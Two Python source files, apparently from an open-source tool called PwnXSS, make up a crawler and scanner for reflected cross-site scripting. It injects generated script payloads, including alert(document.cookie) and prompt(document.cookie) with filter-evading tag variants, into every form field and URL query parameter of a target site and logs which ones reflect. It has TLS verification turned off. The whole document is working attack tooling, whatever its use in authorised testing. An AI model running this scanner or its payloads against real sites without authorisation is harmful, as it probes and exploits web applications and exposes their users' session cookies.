core.py
from lib.helper.helper import *
from lib.helper.Log import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class core:

    @classmethod
    def generate(cls, eff):
        FUNCTION = [
            "prompt(5000/200)",
            "alert(6000/3000)",
            "alert(document.cookie)",
            "prompt(document.cookie)",
            "console.log(5000/3000)"
        ]
        if eff == 1:
            return "<script/>" + FUNCTION[randint(0, 4)] + "<\\script\\>"
        elif eff == 2:
            return "<script/>" + FUNCTION[randint(0, 4)] + "<\\script>"
        elif eff == 3:
            return "<script\\> " + FUNCTION[randint(0, 4)] + "<\\/script>"
        elif eff == 4:
            return "<script>" + FUNCTION[randint(0, 4)] + "<\\script\\>"
        elif eff == 5:
            return "<script>" + FUNCTION[randint(0, 4)] + "<\\/script>"
        elif eff == 6:
            return "<script>" + FUNCTION[randint(0, 4)] + "</script>"

    @classmethod
    def post_method(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        forms = bsObj.find_all("form", method=True)
        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = cls.url
            if form["method"].lower().strip() == "post":
                Log.warning("Target have form with POST method: " + urljoin(cls.url, action))
                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        keys.update({key["name"]: cls.payload})
                    except KeyError:
                        continue
                response = cls.session.post(urljoin(cls.url, action), data=keys)
                if cls.detect_reflected_xss(response.text):
                    Log.reflected_xss("Detected XSS (POST) at " + urljoin(cls.url, action))
                    with open("xss.txt", "a") as file:
                        file.write(urljoin(cls.url, action) + "\n")
                    Log.reflected_xss("Post data: " + str(keys))
                else:
                    Log.info("Parameter page using (POST) payloads but not 100% yet...")

    @classmethod
    def get_method_form(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        forms = bsObj.find_all("form", method=True)
        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = cls.url
            if form["method"].lower().strip() == "get":
                Log.warning("Target have form with GET method: " + urljoin(cls.url, action))
                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        keys.update({key["name"]: cls.payload})
                    except KeyError:
                        continue
                response = cls.session.get(urljoin(cls.url, action), params=keys)
                if cls.detect_reflected_xss(response.text):
                    Log.reflected_xss("Detected XSS (GET) at " + urljoin(cls.url, response.url))
                    with open("xss.txt", "a") as file:
                        file.write(urljoin(cls.url, response.url) + "\n")
                    Log.reflected_xss("GET data: " + str(keys))
                else:
                    Log.info("Parameter page using (GET) payloads but not 100% yet...")

    @classmethod
    def get_method(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        links = bsObj.find_all("a", href=True)
        for a in links:
            url = a["href"]
            if url.startswith("http://") or url.startswith("https://"):
                base = urljoin(cls.url, a["href"])
                query = urlparse(base).query
                if query != "":
                    Log.warning("Found link with query: " + query + " Maybe a vuln XSS point")
                    query_payload = query.replace(query[query.find("=")+1:], cls.payload, 1)
                    test = base.replace(query, query_payload, 1)
                    query_all = base.replace(query, urlencode({x: cls.payload for x in parse_qs(query)}))
                    response_test = cls.session.get(test, verify=False)
                    response_all = cls.session.get(query_all, verify=False)
                    if cls.detect_reflected_xss(response_test.text) or cls.detect_reflected_xss(response_all.text):
                        continue
                    else:
                        Log.info("Parameter page using (GET) payloads but not 100% yet...")
            else:
                Log.info("URL is not an HTTP url, ignoring")

    @classmethod
    def detect_reflected_xss(cls, response_text):
        if cls.payload in response_text:
            Log.reflected_xss("Detected Reflected XSS at " + cls.url)
            with open("reflected_xss.txt", "a") as file:
                file.write(cls.url + "\n")
            return True
        return False

    @classmethod
    def main(cls, url, proxy, headers, payload, cookie, method=2):
        print(W+"*"*15)
        cls.payload = payload
        cls.url = url
        cls.session = session(proxy, headers, cookie)
        Log.info("Checking connection to: " + Y + url)
        try:
            ctr = cls.session.get(url)
            cls.body = ctr.text
        except Exception as e:
            Log.high("Internal error: " + str(e))
            return
        if ctr.status_code > 400:
            Log.info("Connection failed " + str(ctr.status_code))
            return
        else:
            Log.info("Connection established " + str(ctr.status_code))
        if method >= 2:
            cls.post_method()
            cls.get_method()
            cls.get_method_form()
        elif method == 1:
            cls.post_method()
        elif method == 0:
            cls.get_method()
            cls.get_method_form()

pwnxss.py
import argparse
from lib.helper.helper import *
from lib.helper.Log import *
from lib.core import core
from lib.crawler.crawler import *
from random import randint

epilog = """
Github: https://www.github.com/pwn0sec/PwnXSS
Version: 0.5 Final
"""

def check(getopt):
    payload = int(getopt.payload_level)
    if payload > 6 and getopt.payload is None:
        Log.info("Do you want use custom payload (Y/n)?")
        answer = input("> " + W) 
        if answer.lower().strip() == "y":
            Log.info("Write the XSS payload below")
            payload = input("> " + W)
        else:
            payload = core.generate(randint(1, 6))
    else:
        payload = core.generate(payload)
    return payload if getopt.payload is None else getopt.payload
    
def start():
    parse = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, usage="PwnXSS -u <target> [options]", epilog=epilog, add_help=False)
    
    pos_opt = parse.add_argument_group("Options")
    pos_opt.add_argument("--help", action="store_true", default=False, help="Show usage and help parameters")
    pos_opt.add_argument("-u", metavar="", help="Target url (e.g. http://testphp.vulnweb.com)")
    pos_opt.add_argument("--depth", metavar="", help="Depth web page to crawl. Default: 2", default=2)
    pos_opt.add_argument("--payload-level", metavar="", help="Level for payload Generator, 7 for custom payload. {1...6}. Default: 6", default=6)
    pos_opt.add_argument("--payload", metavar="", help="Load custom payload directly (e.g. <script>alert(2005)</script>)", default=None)
    pos_opt.add_argument("--method", metavar="", help="Method setting(s): \n\t0: GET\n\t1: POST\n\t2: GET and POST (default)", default=2, type=int)
    pos_opt.add_argument("--user-agent", metavar="", help="Request user agent (e.g. Chrome/2.1.1/...)", default=agent)
    pos_opt.add_argument("--single", metavar="", help="Single scan. No crawling just one address")
    pos_opt.add_argument("--proxy", default=None, metavar="", help="Set proxy (e.g. {'https':'https://10.10.1.10:1080'})")
    pos_opt.add_argument("--about", action="store_true", help="Print information about PwnXSS tool")
    pos_opt.add_argument("--cookie", help="Set cookie (e.g {'ID':'1094200543'})", default='''{"ID":"1094200543"}''', metavar="")
    
    getopt = parse.parse_args()
    print(logo)
    Log.info("Starting PwnXSS...")
    if getopt.u:
        core.main(getopt.u, getopt.proxy, getopt.user_agent, check(getopt), getopt.cookie, getopt.method)
        crawler.crawl(getopt.u, int(getopt.depth), getopt.proxy, getopt.user_agent, check(getopt), getopt.method, getopt.cookie)
    elif getopt.single:
        core.main(getopt.single, getopt.proxy, getopt.user_agent, check(getopt), getopt.cookie, getopt.method)
    elif getopt.about:
        print("""
***************
Project: PwnXSS
License: MIT
Author: Security Executions Code
Last updates: 2019 may 26
Note: Take your own RISK
****************
""" + epilog)
    else:
        parse.print_help()
        
if __name__ == "__main__":
    start()
